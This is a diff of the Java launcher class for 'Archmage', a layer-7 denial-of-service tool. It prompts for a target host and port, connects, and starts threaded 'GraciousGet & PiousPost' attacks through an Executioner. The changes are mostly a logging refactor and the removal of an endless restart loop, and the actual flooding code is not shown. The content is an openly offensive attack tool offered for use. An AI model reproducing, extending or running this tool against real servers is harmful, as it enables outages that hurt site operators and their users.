@@ -20,13 +20,15 @@ public class Archmage {
 	private String host;
 	private int port;
 	
+	private static Logger log = new Logger("Archmage");
+	
 	public void start() {
 		try {				
 			console = new Scanner(System.in);
-			Logger.console("\n>> Establishing connection to " + host + ":" + port + "...");
+			log.console("\n>> Establishing connection to " + host + ":" + port + "...");
 			socket = new Socket(host, port);
-			Logger.console("\n>> Connection established...");
-			Logger.console("\n>> Begninning GraciousGet attack...\n\n");
+			log.console("\n>> Connection established...");
+			log.console("\n>> Begninning GraciousGet & PiousPost attacks...\n\n");
 			executioner = new Executioner(host, port);
 			executioner.start();
 			while (executioner.isRunning()) {
@@ -39,43 +41,43 @@ public class Archmage {
 							exit();
 						}
 					} else {
-						Logger.info("Attack threads: " + executioner.getActiveCount());
-						Logger.info("Completed threads: " + executioner.getCompletedTaskCount());
+						log.info("Attack threads: " + executioner.getActiveCount());
+						log.info("Completed threads: " + executioner.getCompletedTaskCount());
 					}
 				}
 			}
 		} catch (UnknownHostException e) {			
-			Logger.console("\n>> Could not locate the host; try another, or check again later (UnknownHostException)\n");			
+			log.console("\n>> Could not locate the host (UnknownHostException)\n");			
 		} catch (ConnectException e) {		
-			Logger.console("\n>> Could not connect to the socket address; try another port, or start checking for firewall issues (ConnectException)\n");			
+			log.console("\n>> Could not connect to the socket address, check the port (ConnectException)\n");			
 		} catch (IllegalArgumentException e) {			
-			Logger.console("\n>> Port out of range; try another (IllegalArgumentException)\n");
+			log.console("\n>> Port out of range (IllegalArgumentException)\n");
 		} catch (IOException e) {
-			Logger.console("\n>> Badness while acquiring socket connection (IOException)\n");
+			log.console("\n>> Error acquiriing socket connection (IOException)\n");
 		}
 		init();
 		start();
 	}
 	
 	public void stop() throws IOException {
-		Logger.console("\n>> Stopping attack...");
+		log.console("\n>> Stopping attack...");
 		executioner.stop();
 		socket.close();
-		Logger.console("\n>> Attack stopped...\n");
+		log.console("\n>> Attack stopped...\n");
 	}
 	
 	public void exit() throws IOException {
 		stop();
-		Logger.console("\n>> Exiting...");
+		log.console("\n>> Exiting...");
 		System.exit(0);
 	}
 	
 	public void init() {
 		console = new Scanner(System.in);
-		Logger.console("\nEnter target (IP or host): ");
+		log.console("\nEnter target (IP or host): ");
 		host = console.nextLine();
 		try {
-			Logger.console("Enter port (Default: 80): ");
+			log.console("Enter port (Default: 80): ");
 			String portStr = console.nextLine();
 			if (portStr == null || portStr.length() == 0) {
 				port = 80;
@@ -83,20 +85,18 @@ public class Archmage {
 				port = Integer.parseInt(portStr);
 			}
 		} catch (NumberFormatException e) {		
-			Logger.console("\n>> Port numbers can't contain non-numeric characters\n");
+			log.console("\n>> Port numbers can't contain non-numeric characters\n");
 			init();
 		}		
 	}
 	
 	public static void main(String[] args) {
-		Logger.console("+-------------------+\n");
-		Logger.console("| Archmage (L7 DoS) |\n");
-		Logger.console("+-------------------+\n");
+		log.console("+-------------------+\n");
+		log.console("| Archmage (L7 DoS) |\n");
+		log.console("+-------------------+\n");
 		Archmage archmage;
-		while (true) {
-			archmage = new Archmage();
-			archmage.init();
-			archmage.start();	
-		}
+		archmage = new Archmage();
+		archmage.init();
+		archmage.start();
 	}
 }
